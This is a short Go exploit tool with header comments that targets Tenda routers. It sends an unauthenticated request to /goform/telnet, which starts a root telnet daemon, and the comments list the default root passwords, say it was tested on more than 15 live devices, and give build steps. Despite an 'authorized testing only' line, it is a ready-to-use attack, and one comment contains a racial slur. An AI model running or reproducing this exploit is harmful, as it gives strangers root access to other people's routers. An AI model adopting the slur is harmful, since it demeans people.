// Tenda /goform/telnet - unauthenticated root telnetd..
// AUTHORIZED TESTING ONLY.
//
//	GET /goform/telnet?lan.ip=<bind-ip>
//
// TendaTelnet (symbol @0x45b7f0 in the AC10 httpd) runs, with no auth:
//
//	killall -9 telnetd
//	telnetd -b <lan.ip> &
//
// /etc_ro/passwd ships root accounts user:1234 / support:1234.
//
// Verified: 15+ live Tenda units returned "load telnetd success.".
// Limit:    telnetd binds LAN; WAN:23 is firewalled on tested units.
//
// Build: GO111MODULE=off go build -o tenda_telnet main.go
// Try it urself nigga
package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"time"
)

func main() {
	host := flag.String("url", "", "target, e.g. http://1.2.3.4")
	bind := flag.String("bind", "0.0.0.0", "telnetd bind address")
	flag.Parse()
	if *host == "" {
		fmt.Println("usage: tenda_telnet -url http://host")
		return
	}
	u := *host + "/goform/telnet?lan.ip=" + url.QueryEscape(*bind)
	cl := &http.Client{Timeout: 8 * time.Second}
	r, err := cl.Get(u)
	if err != nil {
		fmt.Println("ERR", err)
		return
	}
	defer r.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(r.Body, 200))
	fmt.Println(string(b))
}
